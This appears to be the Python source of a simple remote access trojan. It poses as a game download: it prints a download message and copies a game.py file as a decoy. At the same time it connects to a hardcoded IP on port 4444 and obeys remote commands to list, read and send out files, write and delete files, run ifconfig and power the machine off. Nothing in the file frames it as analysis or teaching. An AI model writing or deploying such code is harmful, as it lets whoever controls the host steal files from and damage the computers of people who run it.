
import socket
import os
from typing import Tuple


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

IP = "172.29.217.159"

PORT = 4444

ADDRESS : Tuple = (IP, PORT)

s.connect(ADDRESS)




def client():

    print("started downloading your game...")
    with open("{}/{}/{}".format(os.getcwd(), "game","game.py"), "r") as f:
                    text = f.read()
                    with open("game.py", "w") as f:
                        f.write(text)



    
    while  True:

    
    
        cmd = s.recv(1024).decode()

        if cmd == "ping":
            try:
                s.send("pong".encode())
            except:
                s.send("command failed".encode())
        elif cmd == "ls":
            try:
                output = os.popen("ls").read()
                s.send(output.encode())
            except:
                s.send("command failed".encode())

        elif cmd == "touch":
            try:
                file = s.recv(5000).decode()
                os.popen("touch {} ".format(file))
                s.send("Created file {}".format(file).encode("utf-8"))
            except:
                s.send("command failed".encode())
            

        elif cmd == "cd":
            try:
                file = s.recv(5000).decode()
                os.chdir("{}/{}".format(os.getcwd(),file))
                s.send("Cd-ed into file {}".format(file).encode("utf-8"))
            except:
                s.send("command failed".encode())
        elif cmd == "rm":
            file = s.recv(5000).decode("utf-8")
            os.remove(file)
            s.send("removed file {}".format(file).encode("utf-8"))
        elif cmd == "mkdir":
            try:
                dir = s.recv(5000).decode("utf-8")
                os.mkdir(dir)
                s.send("Created directory {}".format(dir).encode("utf-8"))
            except:
                s.send("command failed".encode()) 
        elif cmd == "rmdir":
            try:
                dir = s.recv(5000).decode("utf-8")
                os.rmdir(dir)
                s.send("Removed directory {}".format(dir).encode("utf-8"))
            except:
                s.send("command failed".encode())   
        elif cmd  == "pwd":
                try:
                    s.send(os.getcwd().encode("utf-8"))   
                except:
                    s.send("command failed".encode())
        elif cmd == "ifconfig":
            s.send(os.popen("ifconfig").read().encode("utf-8"))
    
        elif cmd == "downloadf":
            try:
                file = s.recv(5000).decode("utf-8")
                with open(file, "r") as f:
                    text = f.read()
                    s.send(text.encode())
            except:
                s.send("command failed".encode())

        elif cmd == "uploadf":
            try:
                file = s.recv(5000).decode("utf-8")
                text = s.recv(5000).decode("utf-8")
                with open(file, "w+") as f:
                     f.write(text)
                     s.send("Uploaded file: {}".format(file).encode("utf-8"))
            except:
                s.send("command failed".encode())
        elif cmd == "shutdown":
            try:
                if os.name == "posix":
                    os.system("systemctl poweroff")
                else:
                    os.system("shutdown /s /t 1")

            except:
                s.send("command failed".encode())

client()
   
